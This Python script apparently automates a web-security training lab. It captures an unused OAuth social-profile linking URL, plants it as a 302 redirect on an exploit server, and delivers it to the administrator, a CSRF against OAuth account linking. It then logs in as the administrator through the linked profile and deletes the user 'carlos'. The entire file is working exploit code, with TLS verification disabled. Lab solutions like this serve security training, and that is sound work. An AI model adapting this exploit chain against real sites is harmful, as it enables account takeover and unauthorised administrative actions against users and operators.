#!/usr/bin/env python3
import requests
import sys
import time
import urllib3
from bs4 import BeautifulSoup

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

WIENER_USER = "wiener"
WIENER_PASS = "peter"
ATTACKER_SOCIAL_USER = "peter.wiener"
ATTACKER_SOCIAL_PASS = "hotdog"


def get_csrf_token(s, url):
    r = s.get(url, verify=False, proxies=proxies, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    tag = soup.find("input", {"name": "csrf"})
    return tag["value"] if tag else None


def login(s, url, username, password):
    login_page = f"{url}/login"
    csrf = get_csrf_token(s, login_page)
    data = {"username": username, "password": password}
    if csrf:
        data["csrf"] = csrf
    r = s.post(login_page, data=data, verify=False, proxies=proxies, timeout=10)
    return f"Your username is: {username}" in r.text


def get_exploit_host(s, url):
    r = s.get(f"{url}/", verify=False, proxies=proxies, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    link = soup.find("a", attrs={"id": "exploit-link"})
    if not link:
        return None
    return link["href"].rstrip("/")


def get_attach_link(s, url):
    r = s.get(f"{url}/my-account", verify=False, proxies=proxies, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    link = soup.find("a", string="Attach a social profile")
    return link["href"] if link else None


def get_linking_code(s, url):
    oauth_link = get_attach_link(s, url)
    if not oauth_link:
        print("[-] Could not find the 'attach social profile' link on /my-account")
        return None

    r = s.get(oauth_link, verify=False, proxies=proxies, timeout=10)
    interaction_url = r.url

    data = {"username": ATTACKER_SOCIAL_USER, "password": ATTACKER_SOCIAL_PASS}
    r = s.post(f"{interaction_url}/login", data=data,
               verify=False, proxies=proxies, timeout=10)
    if "/confirm" not in r.text:
        print("[-] Failed to reach confirmation page")
        return None
    r = s.post(f"{interaction_url}/confirm", allow_redirects=False,
               verify=False, proxies=proxies, timeout=10)
    first_hop = r.headers.get("Location")
    if not first_hop:
        print("[-] /confirm did not return a redirect")
        return None

    r = s.get(first_hop, allow_redirects=False, verify=False, proxies=proxies, timeout=10)
    linking_url = r.headers.get("Location")
    if not linking_url or "/oauth-linking" not in linking_url:
        print(f"[-] Unexpected redirect target: {linking_url}")
        return None
    return linking_url


def store_exploit(s, exploit_host, linking_url):
    data = {
        "urlIsHttps": "on",
        "responseFile": "/exploit",
        "responseHead": f"HTTP/1.1 302 Found\r\nContent-Type: text/html; charset=utf-8\r\nLocation: {linking_url}",
        "responseBody": "Nothing here...",
        "formAction": "STORE",
    }
    r = s.post(exploit_host, data=data, verify=False, proxies=proxies, timeout=10)
    return r.status_code == 200


def deliver_to_victim(s, exploit_host):
    r = s.get(f"{exploit_host}/deliver-to-victim", allow_redirects=False,
              verify=False, proxies=proxies, timeout=10)
    return r.status_code == 302


def login_via_social_media(s, url):
    r = s.get(f"{url}/login", verify=False, proxies=proxies, timeout=10)
    soup = BeautifulSoup(r.text, "html.parser")
    link = soup.find("a", string="Login with social media")
    if not link:
        print("[-] Could not find the 'Login with social media' link")
        return False
    oauth_link = link["href"]
    r = s.get(oauth_link, verify=False, proxies=proxies, timeout=10)
    return "You have successfully logged in with your social media account" in r.text


def delete_carlos(s, url):
    r = s.get(f"{url}/admin/delete?username=carlos", allow_redirects=False,
               verify=False, proxies=proxies, timeout=10)
    return r.status_code == 302


def check_solved(s, url, retries=5, delay=1.5):
    for attempt in range(retries):
        r = s.get(f"{url}/", verify=False, proxies=proxies, timeout=10)
        if "Congratulations" in r.text:
            print("[+] Lab solved!")
            return True
        if attempt < retries - 1:
            time.sleep(delay)
    print("[-] Lab not solved yet")
    return False


def main():
    if len(sys.argv) != 2:
        print(f"[+] Usage: {sys.argv[0]} <URL>")
        sys.exit(0)

    url = sys.argv[1].strip().rstrip("/")
    s = requests.Session()

    exploit_host = get_exploit_host(s, url)
    if not exploit_host:
        print("[-] Failed to find exploit server link")
        return False
    print(f"[+] Found exploit server: {exploit_host}")

    if not login(s, url, WIENER_USER, WIENER_PASS):
        print("[-] Login failed")
        return False
    print("[+] Logged in as wiener")

    linking_url = get_linking_code(s, url)
    if not linking_url:
        print("[-] Failed to obtain a valid, unused linking code")
        return False
    print(f"[+] Captured unused linking URL: {linking_url}")

    if not store_exploit(s, exploit_host, linking_url):
        print("[-] Failed to store exploit")
        return False
    print("[+] Stored exploit")

    if not deliver_to_victim(s, exploit_host):
        print("[-] Failed to deliver exploit to victim")
        return False
    print("[+] Delivered exploit to victim (admin)")

    time.sleep(2)

    s.get(f"{url}/logout", allow_redirects=False, verify=False, proxies=proxies, timeout=10)
    print("[+] Logged out as wiener")

    if not login_via_social_media(s, url):
        print("[-] Social login did not land on the administrator account")
        return False
    print("[+] Logged in as administrator via linked social profile")

    if not delete_carlos(s, url):
        print("[-] Failed to delete carlos")
        return False
    print("[+] Deleted carlos")

    check_solved(s, url)


if __name__ == "__main__":
    main()